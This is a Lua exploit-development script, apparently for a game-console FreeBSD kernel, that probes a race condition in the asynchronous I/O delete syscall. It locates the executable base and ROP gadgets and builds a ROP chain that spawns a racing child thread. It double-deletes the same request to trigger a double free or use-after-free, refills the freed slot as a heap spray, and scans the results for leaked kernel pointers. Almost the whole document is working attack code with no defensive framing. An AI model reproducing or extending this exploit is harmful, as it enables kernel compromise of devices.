-- CRASH_CLASS: HIGH
-- PROBE 65g: aio_multi_delete TOCTOU race — clean path
--
-- 65f proved: 670 (AIO init) poisons the delete path. Without 670,
-- submit+delete returns state=0x00000000 (success). With 670, it
-- returns 0x80020010 (broken).
--
-- This probe: NO 670, NO cancel. Pure submit(669) → race two 662
-- deletes (main thread + child thread) → immediate resubmit to fill
-- the freed slot.

print("=== PROBE 65g: aio_multi_delete race (clean) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV + SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Open /dev/zero (instant completion for AIO reads)
local fd_zero = -1
repeat
    local ok, rv = pcall(function() return mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)) end)
    if ok then fd_zero = sgn(rv) end
until true
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("ABORT: no /dev/zero"); return end

-- NO 670 INIT — this is the key insight from 65f

-- AIO buffers for main thread
local reqs = memory.alloc(0x200)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local ids_main = memory.alloc(0x100)
local states_main = memory.alloc(0x100)

-- Separate buffers for child thread (avoid sharing with main)
local ids_child = memory.alloc(0x100)
local states_child = memory.alloc(0x100)

local function fill_req(base, fd)
    wq(base + 0x00, uint64(0))
    wq(base + 0x08, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl); wd(base + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(base + 0x18, rl); wd(base + 0x1C, rh)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function aio_submit(fd)
    fill_req(N(reqs), fd)
    wd(N(result_buf), 0)
    wd(N(ids_main), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_main)))
    end)
    return ok and sgn(rv) or nil, rd(N(ids_main)) or 0
end

local function aio_delete_main(id)
    wd(N(ids_main), id)
    wd(N(states_main), 0xDEADDEAD)
    local ok, rv = pcall(function()
        return mk(662)(uint64(N(ids_main)), uint64(1), uint64(N(states_main)))
    end)
    return ok and sgn(rv) or nil, rd(N(states_main)) or 0
end

-- [A] Sanity: confirm delete works without 670
print("")
print("[A] sanity — delete without 670")
local s_ret, s_id = aio_submit(fd_zero)
print(string.format("  submit: ret=%s id=0x%08X", tostring(s_ret), s_id))
local d_ret, d_state = aio_delete_main(s_id)
print(string.format("  delete: ret=%s state=0x%08X (%s)", tostring(d_ret), d_state,
    d_state == 0 and "OK" or "FAIL"))

if d_state ~= 0 then
    print("  ABORT: delete broken even without 670")
    return
end

-- Double-delete to confirm cleanup
local d2_ret, d2_state = aio_delete_main(s_id)
print(string.format("  delete2: ret=%s state=0x%08X (expect 0x80020003=unknown)", tostring(d2_ret), d2_state))

if not alive() then print("DEAD after sanity"); return end

-- [B] TOCTOU RACE
print("")
print("[B] TOCTOU race — main + child concurrent 662")

local RACE_ITERS = 20
local double_success = 0
local kptrs = 0
local main_wins = 0
local child_wins = 0
local both_fail = 0

for iter = 1, RACE_ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD (possible UAF crash!) ***", iter))
        break
    end

    -- Submit AIO read on /dev/zero (completes instantly)
    local sr, sid = aio_submit(fd_zero)
    if sr ~= 0 or sid == 0 then
        print(string.format("  iter %d: submit failed", iter))
        break
    end

    -- Prepare child buffers
    wd(N(ids_child), sid)
    wq(N(states_child), uint64(0xBAD0DEAD))

    -- Build child ROP chain: sysarch + 662 + thr_exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE=129, &fs_ptr)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    -- 662(ids_child, 1, states_child)
    emit(g_pop_rdi); emit(uint64(N(ids_child)))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(N(states_child)))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)

    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    -- thr_param
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, g_bare_ret)       -- start_func = bare ret (ROP takes over from stack)
    wq(pa + 8, uint64(0))    -- arg
    wq(pa + 0x10, uint64(sb))     -- stack_base
    wq(pa + 0x18, uint64(ss))     -- stack_size
    local tid_buf = memory.alloc(8); wq(N(tid_buf), uint64(0))
    wq(pa + 0x30, tid_buf)        -- child_tid

    -- Spawn child (it starts executing 662 immediately)
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- RACE: main thread also calls 662 on the SAME ID right now
    local main_ret, main_state = aio_delete_main(sid)

    -- Immediately resubmit to fill freed slot (heap spray)
    local rs_ret, rs_id = aio_submit(fd_zero)

    -- Wait for child to finish
    for w = 1, 30000 do local _ = rd(sb) end

    -- Read child result
    local child_raw = rq(N(states_child))
    local csh, csl = get_hi_lo(child_raw)

    local m_ok = (main_state == 0)
    local c_ok = (csl == 0 and csh == 0)

    if m_ok and c_ok then
        double_success = double_success + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** main=0 child=0 resub=0x%X", iter, rs_id or 0))
    elseif m_ok and not c_ok then
        main_wins = main_wins + 1
        if iter <= 5 or iter == RACE_ITERS then
            print(string.format("  iter %d: main=0x%X child=%s (main won)", iter, main_state, fmt(child_raw)))
        end
    elseif not m_ok and c_ok then
        child_wins = child_wins + 1
        if iter <= 5 or iter == RACE_ITERS then
            print(string.format("  iter %d: main=0x%X child=%s (child won)", iter, main_state, fmt(child_raw)))
        end
    else
        both_fail = both_fail + 1
        if iter <= 5 or iter == RACE_ITERS then
            print(string.format("  iter %d: main=0x%X child=%s (both fail?)", iter, main_state, fmt(child_raw)))
        end
    end
    if iter == 6 and RACE_ITERS > 8 then print("  ...") end

    -- kptr check
    if csh ~= 0 and csh ~= 0xFFFFFFFF and csh >= 0xFFFF8000 then
        kptrs = kptrs + 1
        print(string.format("  iter %d: *** KPTR: %s ***", iter, fmt(child_raw)))
    end

    -- Clean resubmitted
    if rs_ret == 0 and rs_id and rs_id ~= 0 then
        aio_delete_main(rs_id)
    end
end

-- [C] Summary
print("")
print("[C] SUMMARY")
print(string.format("  iterations:      %d", RACE_ITERS))
print(string.format("  DOUBLE DELETES:  %d", double_success))
print(string.format("  main won:        %d", main_wins))
print(string.format("  child won:       %d", child_wins))
print(string.format("  both failed:     %d", both_fail))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if double_success > 0 then
    print("")
    print("****************************************************")
    print("*** RACE CONFIRMED — DOUBLE FREE / UAF IS LIVE   ***")
    print("*** Next: heap spray to control freed object      ***")
    print("****************************************************")
elseif main_wins > 0 and child_wins > 0 then
    print("")
    print("Both threads are winning the race — they're just not")
    print("winning SIMULTANEOUSLY. Need tighter timing or more iters.")
elseif main_wins == RACE_ITERS or child_wins == 0 then
    print("")
    print("Main always wins — child too slow. Need faster child or")
    print("delay before main's 662.")
end

print("")
print("=== 65g COMPLETE ===")
